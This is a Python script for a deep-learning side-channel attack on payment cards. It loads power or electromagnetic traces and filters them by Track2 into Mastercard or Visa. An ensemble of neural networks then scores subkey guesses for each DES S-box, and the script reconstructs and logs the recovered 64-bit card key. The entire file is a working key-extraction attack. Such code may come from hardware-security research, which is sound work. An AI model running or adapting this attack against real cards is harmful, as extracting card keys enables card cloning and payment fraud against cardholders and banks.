import os
import torch
import torch.nn.functional as F
import numpy as np
import pandas as pd
from src.model_zaid import get_model
from src.utils import setup_logger
from src.crypto import apply_permutation, IP, E_TABLE, des_sbox_output, reconstruct_key_from_rk1

logger = setup_logger("ensemble_attack")

def full_ensemble_attack(processed_dir, model_dir, num_models=5, card_type="universal"):
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    
    # 1. Load Data
    x_path = os.path.join(processed_dir, "X_features.npy")
    y_path = os.path.join(processed_dir, "Y_meta.csv")
    if not os.path.exists(x_path):
        logger.error(f"Features not found: {x_path}")
        return None
        
    X_full = np.load(x_path).astype(np.float32)
    df = pd.read_csv(y_path)

    # --- SELECTIVE INFERENCE (Robust Filtering) ---
    if card_type and card_type.lower() != "universal":
        target = card_type.lower()
        indices = []
        for idx, row in df.iterrows():
            t2 = str(row.get('Track2', '')).strip().upper()
            profile = 'Mastercard' if t2.startswith('5') else ('Visa' if t2.startswith('4') else 'Unknown')
            if target == "mastercard" and profile == "Mastercard":
                indices.append(idx)
            elif target == "visa" and "Visa" in profile:
                indices.append(idx)
        
        if not indices:
            logger.error(f"No traces matching card_type '{card_type}' found in metadata.")
            return None
            
        logger.info(f"Selective Inference: Filtered for {len(indices)} traces matching {card_type}.")
        df = df.iloc[indices].reset_index(drop=True)
        X_full = X_full[indices]

    # Z-Score Normalization
    mean = np.mean(X_full, axis=0)
    std = np.std(X_full, axis=0)
    std[std == 0] = 1
    X = (X_full - mean) / std
    
    # 2. Metadata for ATC
    
    # Pre-calculate R0-expanded for all traces
    # We need the ATC from metadata
    logger.info("Pre-calculating expanded inputs...")
    er0_list = []
    for idx, row in df.iterrows():
        # Get ATC bytes (ATC_0 through ATC_7)
        atc_bytes = bytes([int(row.get(f'ATC_{j}', 0)) for j in range(8)])
        atc_int = int.from_bytes(atc_bytes, 'big')
        # Apply IP
        atc_ip = apply_permutation(atc_int, IP, width=64)
        r0 = atc_ip & 0xFFFFFFFF
        # Apply E-Expansion
        er0 = apply_permutation(r0, E_TABLE, width=32)
        er0_list.append(er0)
    
    er0_arr = np.array(er0_list, dtype=np.uint64)
    
    # 3. Ensemble Predictions
    sbox_winners = []
    n_attack = min(5000, len(X)) # Attack using up to 5000 traces for 100% confidence
    
    for sbox_idx in range(1, 9):
        logger.info(f"Attacking S-Box {sbox_idx} with Ensemble...")
        
        # Load models
        models = []
        for i in range(num_models):
            path = os.path.join(model_dir, f"sbox{sbox_idx}_model{i}.pth")
            if os.path.exists(path):
                model = get_model(input_dim=X.shape[1], num_classes=16).to(device)
                model.load_state_dict(torch.load(path, map_location=device))
                model.eval()
                models.append(model)
        
        if not models:
            logger.error(f"No models for S-Box {sbox_idx}")
            sbox_winners.append(0)
            continue
            
        # Get probs (averaged across ensemble)
        X_batch = torch.from_numpy(X[:n_attack]).to(device)
        with torch.no_grad():
            all_preds = []
            for m in models:
                outputs = m(X_batch)
                probs = F.softmax(outputs, dim=1).cpu().numpy()
                all_preds.append(probs)
            avg_probs = np.mean(all_preds, axis=0)
        
        # Scoring
        key_scores = np.zeros(64)
        shift = 42 - ((sbox_idx-1) * 6)
        
        # Vectorized scoring logic
        # For each key_guess, map trace inputs to predicted outputs and sum log-probs
        for k_guess in range(64):
            # er0_arr has shape (N,)
            # Inputs to S-Box: er0_chunk ^ k_guess
            er0_chunk = (er0_arr[:n_attack] >> shift) & 0x3F
            sbox_in = er0_chunk ^ k_guess
            
            # This requires a vectorized version of des_sbox_output
            # Since we only have one sbox_idx here, we can use the table directly
            from src.crypto import _SBOX
            sbox_table = _SBOX[sbox_idx-1]
            
            # Map input (0-63) to output (0-15)
            # des_sbox_output uses bits 0 and 5 for row (b1b6), 1-4 for col (b2b3b4b5)
            # int val: 5 4 3 2 1 0 -> b1 b2 b3 b4 b5 b6
            b1 = (sbox_in >> 5) & 1
            b6 = sbox_in & 1
            row = (b1 << 1) | b6
            col = (sbox_in >> 1) & 0xF
            sbox_outputs = np.array([sbox_table[int(r * 16 + c)] for r, c in zip(row, col)])
            
            # Sum log-probabilities
            # Using small epsilon for log stability
            vals = avg_probs[np.arange(n_attack), sbox_outputs]
            key_scores[k_guess] = np.sum(np.log(vals + 1e-12))
            
        winner = np.argmax(key_scores)
        logger.info(f"S-Box {sbox_idx} Winner: {winner} (Confidence: {key_scores[winner]:.2f})")
        sbox_winners.append(winner)
        
    # 4. Reconstruction
    final_key_int = reconstruct_key_from_rk1(sbox_winners)
    final_key_hex = f"{final_key_int:016X}"
    logger.info(f"FINAL RECOVERED 64-BIT KEY: {final_key_hex}")
    
    return final_key_hex

if __name__ == "__main__":
    # Test on Mastercard
    full_ensemble_attack("Processed/Mastercard", "Models/Ensemble_ZaidNet")
